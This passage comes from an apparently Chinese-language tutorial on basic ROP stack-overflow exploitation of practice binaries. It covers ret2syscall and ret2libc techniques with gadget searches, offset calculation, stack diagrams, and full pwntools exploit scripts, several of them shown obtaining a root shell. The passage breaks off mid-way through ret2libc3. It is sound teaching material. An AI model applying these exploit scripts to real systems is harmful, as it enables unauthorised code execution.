language-bash\"\u003e➜  ret2syscall checksec ret2syscall            \n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/Test/StackBufferOverFlow/ret2syscall/ret2syscall'\u003c/span\u003e\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这里还涉及到系统调用，一般我们通过一下系统调用来获得\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eexecve(\u003cspan class=\"hljs-string\"\u003e\"/bin/sh\"\u003c/span\u003e,NULL,NULL)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e当遇到\u003ccode\u003e32\u003c/code\u003e位程序时，需要使得：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e系统调用号，即 eax 应该为 \u003ccode\u003e0xb\u003c/code\u003e（\u003ccode\u003e0xb\u003c/code\u003e 为 \u003ccode\u003eexecve\u003c/code\u003e 对应的系统调用号）也就是\u003ccode\u003e11\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e第一个参数，即 ebx 应该指向 \u003ccode\u003e/bin/sh\u003c/code\u003e 的地址，其实执行 sh 的地址也可以。\u003c/li\u003e\n\u003cli\u003e第二个参数，即 ecx 应该为 \u003ccode\u003e0\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e第三个参数，即 edx 应该为 \u003ccode\u003e0\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e最后将系统调用和参数都填入寄存器后，我们再让系统触发 \u003ccode\u003e0x80\u003c/code\u003e 号中断（\u003ccode\u003eint 0x80\u003c/code\u003e）\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eLinux\u003c/code\u003e对系统调用的调用必须通过执行\u003ccode\u003eint $0x80\u003c/code\u003e汇编指令，这条指令会产生向量为\u003ccode\u003e128\u003c/code\u003e的编程异常\u003c/p\u003e\n\u003cp\u003eIDA 反编译程序，依旧是\u003ccode\u003egets\u003c/code\u003e ，存在缓冲区溢出漏洞\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eshift\u003c/code\u003e + \u003ccode\u003eF12\u003c/code\u003e 查看程序字符串，能看到 \u003ccode\u003e/bin/sh\u003c/code\u003e 我们刚好可以利用\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是因为开启了 \u003ccode\u003eNX\u003c/code\u003e 我们无法往栈上写，写了也无法执行，也不存在\u003ccode\u003esystem(\"/bin/sh\")\u003c/code\u003e 代码段，程序是静态的，所以 \u003ccode\u003eret2shellcode\u003c/code\u003e \u003ccode\u003eret2text\u003c/code\u003e \u003ccode\u003eret2libc\u003c/code\u003e 都无法使用，但是存在\u003ccode\u003e/bin/sh\u003c/code\u003e 代码片段，所以我们可以尝试 \u003ccode\u003eret2syscall\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e通过\u003ccode\u003eROPgadget\u003c/code\u003e 查找需要用到寄存器指令\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003epop eax ; ret\u003c/code\u003e 地址为 \u003ccode\u003e0x080bb196\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ret2syscall ROPgadget --binary ret2syscall --only \u003cspan class=\"hljs-string\"\u003e\"pop|ret\"\u003c/span\u003e | grep eax\n0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret\n**0x080bb196 : pop eax ; ret**\n0x0807217a : pop eax ; ret 0x80e\n0x0804f704 : pop eax ; ret 3\n0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现一串连续的将\u003ccode\u003eebx~edx\u003c/code\u003e弹出的\u003ccode\u003epop edx ; pop ecx ; pop ebx ; ret\u003c/code\u003e ，地址为\u003ccode\u003e0x0806eb90\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ret2syscall ROPgadget --binary ret2syscall --only \u003cspan class=\"hljs-string\"\u003e\"pop|ret\"\u003c/span\u003e | grep ebx\n0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret\n0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret\n0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret\n0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret\n0x080be23f : pop ebx ; pop edi ; ret\n0x0806eb69 : pop ebx ; pop edx ; ret\n0x08092258 : pop ebx ; pop esi ; pop ebp ; ret\n0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10\n0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14\n0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc\n0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4\n0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8\n0x08048913 : pop ebx ; pop esi ; pop edi ; ret\n0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4\n0x08049a94 : pop ebx ; pop esi ; ret\n0x080481c9 : pop ebx ; ret\n0x080d7d3c : pop ebx ; ret 0x6f9\n0x08099c87 : pop ebx ; ret 8\n0x0806eb91 : pop ecx ; pop ebx ; ret\n0x0806336b : pop edi ; pop esi ; pop ebx ; ret\n**0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret**\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e命令字段 \u003ccode\u003e0x080be408\u003c/code\u003e 地址\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ret2syscall ROPgadget --binary ret2syscall --string \u003cspan class=\"hljs-string\"\u003e\"/bin/sh\"\u003c/span\u003e         \nStrings information\n============================================================\n0x080be408 : /bin/sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e中断代码地址 \u003ccode\u003e0x08049421\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ret2syscall ROPgadget --binary ret2syscall --only \u003cspan class=\"hljs-string\"\u003e\"int\"\u003c/span\u003e   \nGadgets information\n============================================================\n0x08049421 : int 0x80\n0x080890b5 : int 0xcf\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e计算偏移量，为\u003ccode\u003e112\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epwndbg\u003e cyclic 200\naaaabaaacaaa...waabxaabyaab\n\npwndbg\u003e run\nStarting program: /root/Desktop/Test/StackBufferOverFlow/ret2syscall/ret2syscall \nThis \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e, no system() and NO SHELLCODE!!!\nWhat \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e you plan to \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e?\naaaabaaacaaadaaaeaaafaaagaaaabuaabvaabwaabxaabyaab\n\nProgram received signal SIGSEGV, Segmentation fault.                  \n0x62616164 \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e ?? ()                                                                                               \nLEGEND: STACK | HEAP | CODE | DATA | WX | RODATA                                                                  \n───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─\n ECX  0xfbad2288                                                                                                  \n EDX  0x80eb4e0 (_IO_stdfile_0_lock) ◂— 0                                                                         \n EDI  0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8067b10 (__stpcpy_sse2) ◂— mov edx, dword ptr [esp + 4]\n ESI  0             \n ESP  0xffffd100 ◂— \u003cspan class=\"hljs-string\"\u003e'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'\u003c/span\u003e\n EIP  0x62616164 (\u003cspan class=\"hljs-string\"\u003e'daab'\u003c/span\u003e)\n─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eemulate\u003c/span\u003e on ]──────────\nInvalid address 0x62616164\n\npwndbg\u003e cyclic -l daab\nFinding cyclic pattern of 4 bytes: b\u003cspan class=\"hljs-string\"\u003e'daab'\u003c/span\u003e (hex: 0x64616162)\nFound at offset 112\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用代码块绘制的利用链\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e           |-----------------------------| 高地址\n           | ...                         |\n           |-----------------------------|\n           | int_0x80_addr               |  \u0026#x3C;-- ret from pop_..._ret\n           |-----------------------------|\n           | bin_sh_addr                 |  \u0026#x3C;-- pop into ebx\n           |-----------------------------|\n           | 0x0                         |  \u0026#x3C;-- pop into ecx\n           |-----------------------------|\n           | 0x0                         |  \u0026#x3C;-- pop into edx\n           |-----------------------------|\n           | pop_edx_ecx_ebx_ret_addr    |  \u0026#x3C;-- ret from pop_eax_ret\n           |-----------------------------|\n           | 0xb                         |  \u0026#x3C;-- pop into eax\n           |-----------------------------|\n           | pop_eax_ret_addr            |  \u0026#x3C;-- Overwritten \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e address\n   ebp     |-----------------------------|\n           | ...                         |\n           |-----------------------------|\n   buf -\u003e  | gets buffer start           |\n   esp     |-----------------------------| 低地址\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e编写\u003ccode\u003eEXP\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom pwn import *\n\npop_eax_ret_addr = 0x080bb196\npop_edx_ecx_ebx_addr = 0x0806eb90\nbin_sh_addr = 0x080be408\nint_0x80_addr = 0x08049421\n\nsh = process(\u003cspan class=\"hljs-string\"\u003e'./ret2syscall'\u003c/span\u003e)\nsh.sendline(b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e*112 + p32(pop_eax_ret_addr) + p32(0xb) + p32(pop_edx_ecx_ebx_addr) + p32(0) + p32(0) + p32(bin_sh_addr) + p32(int_0x80_addr))\nsh.interactive()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  ret2syscall python exp.py\n[+] Starting \u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003e process \u003cspan class=\"hljs-string\"\u003e'./ret2syscall'\u003c/span\u003e: pid 2825\n[*] Switching to interactive mode\nThis \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e, no system() and NO SHELLCODE!!!\nWhat \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e you plan to \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e?\n$ \u003cspan class=\"hljs-built_in\"\u003ewhoami\u003c/span\u003e\nroot\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eret2libc\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eret2libc\u003c/code\u003e 即控制函数的执行 \u003ccode\u003elibc\u003c/code\u003e 中的函数，通常是返回至某个函数的 \u003ccode\u003eplt\u003c/code\u003e 处或者函数的具体位置 (即函数对应的 \u003ccode\u003egot\u003c/code\u003e 表项的内容)。\u003c/p\u003e\n\u003cp\u003e其中 \u003ccode\u003elibc\u003c/code\u003e 指的是\u003ccode\u003eC\u003c/code\u003e 标准库（\u003ccode\u003estandard C library\u003c/code\u003e）的实现，通常是 \u003ccode\u003e/lib/x86_64-linux-gnu/libc.so.6\u003c/code\u003e 或 \u003ccode\u003e/lib/i386-linux-gnu/libc.so.6\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003elibc\u003c/code\u003e库是\u003ccode\u003eLinux\u003c/code\u003e下的\u003ccode\u003eC\u003c/code\u003e函数库，而\u003ccode\u003elibc\u003c/code\u003e库中存放的就是这些函数的偏移地址，所以只要确定了\u003ccode\u003elibc\u003c/code\u003e库的版本，就能知道函数的偏移地址，但是我们这里在本地运行的样本，所以可以直接忽视。\u003c/p\u003e\n\u003ch3\u003eret2libc1\u003c/h3\u003e\n\u003cp\u003e使用 IDA 反编译，\u003ccode\u003egets\u003c/code\u003e存在缓冲区溢出漏洞\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003esecure\u003c/code\u003e 中的 \u003ccode\u003esystem\u003c/code\u003e被修改了，所以无法使用\u003ccode\u003eret2text\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e32\u003c/code\u003e 位程序，并且调用动态链接库\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ret2libc file ret2libc1         \nret2libc1: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eNX\u003c/code\u003e 启动，所以\u003ccode\u003eret2shellcode\u003c/code\u003e 也无法使用\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ret2libc checksec ret2libc1 \n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc1'\u003c/span\u003e\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e因为这里用了动态链接库，所以优先使用 \u003ccode\u003eret2libc\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e字符串中能看到 \u003ccode\u003e/bin/sh\u003c/code\u003e \u003ccode\u003e08048720\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试寻找 \u003ccode\u003esystem\u003c/code\u003e函数，也找到了\u003ccode\u003e08048460\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e计算偏移值（和上边一样的操作）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epwndbg\u003e cyclic -l daab\nFinding cyclic pattern of 4 bytes: b\u003cspan class=\"hljs-string\"\u003e'daab'\u003c/span\u003e (hex: 0x64616162)\nFound at offset 112\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  ret2libc \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e exp.py \nfrom pwn import *\n\nsystem_plt_addr = 0x08048460\nbin_sh_addr = 0x8048720\nsh = process(\u003cspan class=\"hljs-string\"\u003e'./ret2libc1'\u003c/span\u003e)\nsh.sendline(112 * b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e + p32(system_plt_addr) + 4 * b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e + p32(bin_sh_addr))\nsh.interactive()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以看到为什么要加上 \u003ccode\u003e4 * b'A'\u003c/code\u003e ，因为这是给\u003ccode\u003esystem\u003c/code\u003e的假的返回地址\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e           | ... higher addresses ...   |\n           +----------------------------+\n           | p32(bin_sh_addr)           | \u0026#x3C;-- (被我们写入) system 的参数\n           +----------------------------+\n           | 4 * b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e (0x41414141)      | \u0026#x3C;-- (被我们写入) system 的假返回地址\n           +----------------------------+\n           | p32(system_plt_addr)       | \u0026#x3C;-- (被我们写入) 覆盖了 main 的返回地址\n           +----------------------------+\n           | 4 字节的 \u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e               | \u0026#x3C;-- (被我们写入) 覆盖了 old EBP\n           +----------------------------+\n           | 108 字节的 \u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e             | \\\n           | ...                        |  |\n           | \u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e                        |  } 填充了整个 buffer 和额外的空间\n           | \u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e                        | /\n           +----------------------------+ \u0026#x3C;-- buffer 的起始地址\n           | ... lower addresses ...    |\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  ret2libc python exp.py\n[+] Starting \u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003e process \u003cspan class=\"hljs-string\"\u003e'./ret2libc1'\u003c/span\u003e: pid 3166\n[*] Switching to interactive mode\nRET2LIBC \u003e_\u0026#x3C;\n$ \u003cspan class=\"hljs-built_in\"\u003ewhoami\u003c/span\u003e\nroot\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eret2libc2\u003c/h3\u003e\n\u003cp\u003e依旧是 \u003ccode\u003egets\u003c/code\u003e ，存在缓冲区溢出漏洞\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003echecksec\u003c/code\u003e以及文件类型，和\u003ccode\u003eret2libc1\u003c/code\u003e基本没差\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  ret2libc checksec ret2libc1\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc1'\u003c/span\u003e\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n(pwn) ➜  ret2libc file ret2libc2         \nret2libc2: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e字符串中找不到 \u003ccode\u003e/bin/sh\u003c/code\u003e了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003esystem\u003c/code\u003e 函数还在 \u003ccode\u003e0x08048490\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e所以需要我们构造 \u003ccode\u003e/bin/sh\u003c/code\u003e \u003ccode\u003e0x08048480\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e可以看到还存在\u003ccode\u003egets\u003c/code\u003e \u003ccode\u003e0x08048460\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们可以多调用一次\u003ccode\u003egadget\u003c/code\u003e ，所以我们要找到一片可读写的缓冲区\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ebuf2\u003c/code\u003e区域刚好可以 \u003ccode\u003e0x0804A080\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image16.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e此时我们还要保持堆栈平衡，也就是\u003ccode\u003egets\u003c/code\u003e执行完时，\u003ccode\u003egets\u003c/code\u003e的返回地址会处于栈顶，但是接下来我们调用\u003ccode\u003esystem\u003c/code\u003e函数，所以我们需要在返回地址\u003ccode\u003e+4\u003c/code\u003e(就是要把\u003ccode\u003ebuf\u003c/code\u003e清理掉，让\u003ccode\u003eROP\u003c/code\u003e链指向下一条也就是\u003ccode\u003esystem\u003c/code\u003e)，所以这里可以寻找 \u003ccode\u003epop xxx ;ret\u003c/code\u003e 或者 \u003ccode\u003eadd esp 4; ret\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eESP --\u003e | p32(pop_ebx_addr) |  \u0026#x3C;-- gets函数的“返回地址”\n        +-------------------+\n        |  p32(buf2_addr)   |  \u0026#x3C;-- gets函数的参数（gets写入后，我们需要将其弹出）\n        +-------------------+\n        | p32(libc_system_addr) |\n        +-------------------+\n        |      b\u003cspan class=\"hljs-string\"\u003e'B'\u003c/span\u003e*4       |\n        +-------------------+\n        |  p32(buf2_addr)   |\n        +-------------------+\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003eROPgadget\u003c/code\u003e来寻找\u003ccode\u003e0x0804843d\u003c/code\u003e 就符合\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  ret2libc ROPgadget --binary ret2libc2 --only \u003cspan class=\"hljs-string\"\u003e\"pop|ret\"\u003c/span\u003e\nGadgets information\n============================================================\n0x0804872f : pop ebp ; ret\n0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x0804843d : pop ebx ; ret\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e计算偏移值，也和上边一样是\u003ccode\u003e112\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom pwn import *\n\ngets_plt_addr = 0x08048460\npop_ebx_ret_addr = 0x0804843d\nsystem_plt_addr = 0x08048490\nbuf2 = 0x0804A080\n\nsh = process(\u003cspan class=\"hljs-string\"\u003e'./ret2libc2'\u003c/span\u003e)\nsh.sendline(112 * b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e + p32(gets_plt_addr) + p32(pop_ebx_ret_addr) + p32(buf2) + p32(system_plt_addr) + 4 * b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e + p32(buf2))\nsh.sendline(\u003cspan class=\"hljs-string\"\u003e'/bin/sh'\u003c/span\u003e)\nsh.interactive()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  ret2libc python exp.py   \n[+] Starting \u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003e process \u003cspan class=\"hljs-string\"\u003e'./ret2libc2'\u003c/span\u003e: pid 4087\n/root/Desktop/Test/StackBufferOverFlow/ret2libc/exp.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  sh.sendline(\u003cspan class=\"hljs-string\"\u003e'/bin/sh'\u003c/span\u003e)\n[*] Switching to interactive mode\nSomething surprise here, but I don\u003cspan class=\"hljs-string\"\u003e't think it will work.\nWhat do you think ?$ id\nuid=0(root) gid=0(root) 组=0(root)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eret2libc3\u003c/h3\u003e\n\u003cp\u003e依旧是\u003ccode\u003egets\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image17.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e保护机制和文件类型\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ret2libc checksec ret2libc3\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'\u003c/span\u003e\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n➜  ret2libc file ret2libc3\nret2libc3: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, with debug_info, not stripped\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e存在\u003ccode\u003egets\u003c/code\u003e，可以用来构造\u003ccode\u003e/bin/sh\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image18.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image19.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是\u003ccode\u003esystem\u003c/code\u003e函数也没了，所以我们要寻找\u003ccode\u003esystem\u003c/code\u003e函数\u003c/p\u003e\n\u003cp\u003e找到\u003ccode\u003esystem()\u003c/code\u003e函数和\u003ccode\u003e/bin/sh\u003c/code\u003e字符串在\u003ccode\u003elibc\u003c/code\u003e中的地址\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e首先获得一个函数的真实地址，例如：\u003ccode\u003e__libc_start_main\u003c/code\u003e，\u003ccode\u003eputs\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e得到真实地址后，根据最后三位即可得到 libc 版本\u003c/li\u003e\n\u003cli\u003e得到 libc 版本后就可以很容易确定获得的真实函数的偏移地址（这里假设\u003ccode\u003eputs\u003c/code\u003e）\u003c/li\u003e\n\u003cli\u003e计算基地址，基地址 = puts 函数真实地址 - puts 函数偏移地址\u003c/li\u003e\n\u003cli\u003e得到 libc 版本后获取 system 地址与 /bin/sh 的偏移地址\u003c/li\u003e\n\u003cli\u003e根据 真实地址 = 基地址 + 偏移地址\u003c/li\u003e\n\u003cli\u003e再次执行源程序\u003c/li\u003e\n\u003cli\u003e触发栈溢出执行 \u003ccode\u003esystem(‘/bin/sh’)\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e编写脚本泄露\u003ccode\u003elibc_start_main\u003c/code\u003e的真实地址\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom pwn import *\ne = ELF(\u003cspan class=\"hljs-string\"\u003e'./ret2libc3'\u003c/span\u003e)\nsh = process(\u003cspan class=\"hljs-string\"\u003e'./ret2libc3'\u003c/span\u003e)\nputs_plt_addr = e.plt[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nlibc_start_main_got_addr = e.got[\u003cspan class=\"hljs-string\"\u003e'__libc_start_main'\u003c/span\u003e]\nmain_addr = e.symbols[\u003cspan class=\"hljs-string\"\u003e'main'\u003c/span\u003e]\n\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'泄露 libc_start_main_got_addr 并返回到 main'\u003c/span\u003e)\npayload1 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_got_addr)\nsh.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Can you find it !?'\u003c/span\u003e,payload1)\nlibc_start_main_real_addr = u32(sh.recv()[0:4])\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"libc_start_main_real_addr:{hex(libc_start_main_real_addr)}\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image20.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e再下一步我们要得到 \u003ccode\u003elibc\u003c/code\u003e版本和基地址以及\u003ccode\u003esystem\u003c/code\u003e 